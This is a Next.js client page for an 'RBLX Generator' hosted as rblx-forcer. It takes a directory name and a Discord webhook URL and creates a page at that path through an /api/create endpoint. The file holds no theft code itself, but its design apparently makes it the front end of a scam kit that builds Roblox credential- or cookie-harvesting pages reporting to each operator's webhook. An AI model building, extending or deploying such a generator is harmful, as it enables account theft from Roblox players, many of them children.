'use client';
import { useState } from 'react';

export default function Home() {
  const [directory, setDirectory] = useState('');
  const [webhook, setWebhook] = useState('');
  const [message, setMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!directory || !webhook) {
      setMessage('⚠️ Please fill in all fields.');
      return;
    }

    setMessage('⏳ Generating... Please wait.');

    try {
      const res = await fetch('/api/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ directory, webhook }),
      });

      const data = await res.json();

      if (data.success) {
        setMessage(
          `✅ Created successfully! View: https://rblx-forcer.vercel.app/${directory}`
        );
      } else {
        setMessage(`❌ Error: ${data.error || 'Something went wrong.'}`);
      }
    } catch (err) {
      console.error(err);
      setMessage('🚫 Failed to connect to the server.');
    }
  };

  return (
    <main className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white px-4">
      <h1 className="text-3xl font-bold mb-6 text-center">RBLX Generator</h1>

      <form
        onSubmit={handleSubmit}
        className="bg-gray-800 p-6 rounded-2xl shadow-md w-full max-w-md flex flex-col gap-4"
      >
        <label>
          <span className="block mb-1 font-semibold">Directory Name</span>
          <input
            type="text"
            className="w-full p-2 rounded-md text-black"
            value={directory}
            onChange={(e) => setDirectory(e.target.value)}
            placeholder="example-directory"
          />
        </label>

        <label>
          <span className="block mb-1 font-semibold">Webhook URL</span>
          <input
            type="text"
            className="w-full p-2 rounded-md text-black"
            value={webhook}
            onChange={(e) => setWebhook(e.target.value)}
            placeholder="https://discord.com/api/webhooks/..."
          />
        </label>

        <button
          type="submit"
          className="bg-blue-600 hover:bg-blue-700 p-2 rounded-md text-white font-semibold transition-all"
        >
          Generate
        </button>

        {message && (
          <p className="text-sm text-center text-gray-300 mt-2">{message}</p>
        )}
      </form>
    </main>
  );
        }
